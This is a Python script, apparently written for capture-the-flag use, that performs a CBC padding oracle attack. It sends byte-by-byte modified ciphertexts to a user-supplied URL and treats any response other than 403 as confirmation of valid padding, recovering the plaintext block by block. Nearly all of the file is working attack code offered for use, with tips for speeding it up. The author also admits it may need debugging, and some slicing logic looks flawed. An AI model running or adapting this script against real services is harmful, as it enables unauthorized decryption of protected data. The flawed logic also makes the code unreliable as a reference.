
## This code works for ciphers in hex form.

import requests
import codecs

## Function to xor two strings. The strings must be sent in form of a bytes object.

def xor_two_str(a, b, c = 0):
    if(c == 0) :
        xor = "".join([chr(x ^ y) for (x,y) in zip(a,b)])
    else:
        xor = "".join([chr(ord(x) ^ y) for (x,y) in zip(a,b)])    
    return xor

## Pre-defined variables
# The cipher you wanna decipher
actual_c = ''

# The guessed string we'll make
# here initialize it with 00's upto a length of actual_c
guess_s = ''

# Paste the url on which you want to run it
url = ''

# To keep count when the pad reaches its maximum length
ctr = 1

# Number of times the loop will run initially, will be updated per cipher block.
loop_lim = int(len(actual_c)/2) -16

# This will contain the hex values
msg = []
## This list will contain the guesses we'll make in each trial.ASCII values
g = []

# This parameter will tell about the number of blocks we deciphered
nob = 0

for i in range(loop_lim,-1,-1):
    
    ## Getting ready to take on the next block and changing loop_lim values makes the slicing to reduce one block as you will see in a minute
    if(ctr > 16):
        loop_lim = loop_lim - 16
        ctr = 1
        nob = nob + 1
    # The pad will be reinitialised everytime a guess is found
    # Here initial it with 00's upto a length of actual_c
    pad = ""
    
    # To hold the pad that will be made for this guess    
    temp = ''
    # Ctr tells us about the pad length
    for t in range(ctr):
        # The hex() omits the '0' on the right side and hence making a 1 length string. To correct it, this check was required.
        if ctr<=15:
            temp +=  '0' + hex(ctr)[2:]    
        else:
            temp += hex(ctr)[2:]    
        
    # Slicing of the pad to insert the required value    
    pad = pad[: 2*(i - 1) ] + temp + pad[2*loop_lim  : ]
    
    # Initial append on the list to avoid any errors    
    msg.append('00')
    g.append(0)
       
    # The loop will check for all the 256 characters. 
    # Tip : Try to limit out the loop as possible as you can to increase the speed of the program
    
    ## Try to use tricks like running loop only for underscore or some specific character you are sure about or only on alphabets, etc. Optimize it else it will be very slow
    for k in range(0 ,256,1):
        # The current number of guess and the guess in ascii
        g[nob*16 + ctr-1] = chr(k)
        
        # After each succesful block deciphered, the cipher would be shorten out, removing one block.
        cipher = actual_c[0 : 2*(loop_lim + 16)] 
        
        # Stores our new guess string to be xored
        temp2 = ""
        if k<=15:
            temp2 +=  '0' + hex(k)[2:]    
        else:
            temp2 += hex(k)[2:]
            
        # The guess stored in hex    
        msg[nob*16 + ctr-1] = temp2
        
        # Guess is the combined string made from all the guesses that are correct uptill now
        guess = "".join(c for c in reversed(msg[16*nob : ]))
        
        # Again slicing to add our guess.
        guess_s = guess_s[: 2*(i-1)] + guess + guess_s[2*loop_lim : ]
            
        # The xoring occurs in two phase. No matter the order. Here cipher and our guess string is xored. Notice that they are passed to the function as a bytes object so when indexed, they return their respective ASCII code.    
        xor_1 = xor_two_str(codecs.decode(cipher[2*(i-1):2*loop_lim],'hex'), codecs.decode(guess_s[2*(i-1):2*loop_lim],'hex'))
        xor_1_ready = xor_1
        
        # The second xor with the pad. The '-1' parameter is sent to deal with the problems with zeroes.
        xor_2 = xor_two_str(xor_1_ready, codecs.decode(pad[2*(i-1):2*loop_lim],'hex'),-1)
         
        # This stores up the final xor charcter wise to generate the string at the end.
        list = []
        for m in xor_2:
            if(ord(m) <= 15):
                list.append('0' + hex(ord(m))[2:])
            else:
                list.append(hex(ord(m))[2:])
            
        xor_2_ready = "".join(c for c in list)
        
        # Preparing the final cipher for being sent in the request. Again slicing.
        
        cipher = cipher[: 2*(i-1)] + xor_2_ready + cipher[2*loop_lim : ] 
            
        URL = url + cipher            
        r = requests.get(url = URL)
        code = r.status_code
            
        if code == 403:
            continue
        else:
            ctr += 1
            break
            
            

## Let the code swing and if everythings turns out fine, in sometime you will get the result.
## Although i highly encourage to try debugging it once before usage.